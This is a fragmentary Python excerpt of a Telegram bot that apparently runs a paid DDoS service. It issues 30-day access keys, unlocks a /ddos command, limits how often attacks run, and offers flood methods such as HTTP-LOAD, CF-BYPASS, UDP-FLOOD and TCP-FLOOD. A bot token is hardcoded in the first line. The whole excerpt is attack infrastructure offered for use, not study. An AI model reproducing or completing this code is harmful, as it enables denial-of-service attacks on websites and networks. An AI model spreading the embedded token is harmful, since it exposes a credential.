...
bot_token = '6761951846:AAEtjyMiD2DVxommDrpZRKF39ukUgzbe3X4'
    ...
    while cmd_process.poll() is None:
        if psutil.cpu_percent(interval=1) >= 1:
            ...
            if time_passed >= 120:
                ...
                bot.reply_to(message, "Attack command has been used.")
                return
...
def generate_key(message):
    ...
    bot.reply_to(message, f'Tạo key "{key}" Success. The key will expire after 30 days.')
...
def enter_key(message):
    ...
    if key in valid_keys and valid_keys[key] > datetime.datetime.now():
        ...
        bot.reply_to(message, 'The key has been accepted. You can use the command /ddos now.')
    else:
        bot.reply_to(message, 'Invalid key. Please check again or contact the admin.')
...
def attack_command(message):
    ...
    if method in ['HTTP-LOAD', 'CF-BYPASS', 'UDP-FLOOD', 'TCP-FLOOD', 'FLOOD']:
        ...
        bot.reply_to(message, 'Invalid attack method. Use the command /methods to see available attack methods')
